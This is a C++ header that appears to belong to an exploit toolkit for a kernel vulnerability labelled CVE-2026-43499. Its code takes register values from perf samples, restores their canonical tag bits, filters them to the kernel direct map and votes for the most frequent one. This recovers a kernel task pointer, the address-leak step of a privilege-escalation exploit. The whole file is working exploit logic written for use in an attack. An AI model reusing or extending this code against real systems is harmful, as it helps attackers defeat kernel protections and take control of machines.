#pragma once
/** @file backend/cve_2026_43499/perf_vote.hpp
 *  Finding a task pointer by voting among sampled registers.
 *
 *  A perf sampling record hands over a set of register values, and the one that shows up
 *  most often is the one most likely to be the task: the sampler catches the same address
 *  again and again while everything else moves. Three details are the whole rule. A sampled
 *  address has its tag nibble replaced rather than cleared, because the canonical address is
 *  what the direct map is bounded by. Only addresses inside the direct map count, because a
 *  value outside it is not one this can use. And when two addresses tie, the one seen first
 *  wins -- the retired loop compared with a strict greater-than, and a rewrite that used
 *  greater-or-equal would pick the last of the tied group instead, which is a different
 *  answer from the same input.
 *
 *  Nothing here reads memory or calls the kernel: it takes the values someone else sampled
 *  and says which one it would bet on. An empty set has no answer but zero, which is the
 *  same value callers already treat as not found.
 */
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43499 {
    /** How many register values one sample is read for: mechanism, from the retired loop. */
    inline constexpr std::size_t kSampleRegisterVotes = 32U;
    /** How many candidates a pass will hold: mechanism, the capacity of its array. */
    inline constexpr std::size_t kCandidateCapacity = 256U;
    /** The tag nibble lives here, and the canonical address is what it is restored to. */
    inline constexpr std::uint64_t kTagRestore = 0x0fULL << 56U;

    /** What the vote needs to know about where an address may live. */
    struct DirectMapBounds final {
        std::uint64_t begin = 0U;
        std::uint64_t end = 0U;
    };

    /** Restore the canonical tag of a sampled address. */
    [[nodiscard]] constexpr std::uint64_t restore_canonical(std::uint64_t sampled) noexcept {
        return sampled | kTagRestore;
    }

    /** Whether a restored address is one this can use: strictly inside the direct map. */
    [[nodiscard]] constexpr bool inside_direct_map(std::uint64_t candidate,
                                                   const DirectMapBounds &bounds) noexcept {
        return candidate > bounds.begin && candidate < bounds.end;
    }

    /** Take up to kSampleRegisterVotes values from a sample, restore each, and keep the ones
     *  inside the direct map. Returns how many were kept; a full set is not an error. */
    [[nodiscard]] constexpr std::size_t collect_candidates(const std::uint64_t *registers,
                                                           std::size_t register_count,
                                                           const DirectMapBounds &bounds,
                                                           std::uint64_t *out,
                                                           std::size_t out_capacity) noexcept {
        if (registers == nullptr || out == nullptr || out_capacity == 0U) {
            return 0U;
        }
        const std::size_t limit = register_count < kSampleRegisterVotes ? register_count : kSampleRegisterVotes;
        std::size_t kept = 0U;
        for (std::size_t i = 0U; i < limit && kept < out_capacity; ++i) {
            const std::uint64_t candidate = restore_canonical(registers[i]);
            if (inside_direct_map(candidate, bounds)) {
                out[kept] = candidate;
                ++kept;
            }
        }
        return kept;
    }

    /** The address seen most often, or zero when there are none. Ties go to the one seen
     *  first, which is what a strict comparison gives and what the retired loop did. */
    [[nodiscard]] constexpr std::uint64_t vote_for_task(const std::uint64_t *candidates,
                                                        std::size_t count) noexcept {
        if (candidates == nullptr || count == 0U) {
            return 0U;
        }
        std::uint64_t best = 0U;
        std::size_t best_count = 0U;
        for (std::size_t i = 0U; i < count; ++i) {
            std::size_t seen = 0U;
            for (std::size_t j = 0U; j < count; ++j) {
                if (candidates[j] == candidates[i]) {
                    ++seen;
                }
            }
            if (seen > best_count) {
                best_count = seen;
                best = candidates[i];
            }
        }
        return best;
    }
}  // namespace ghostlock::backend::cve_2026_43499
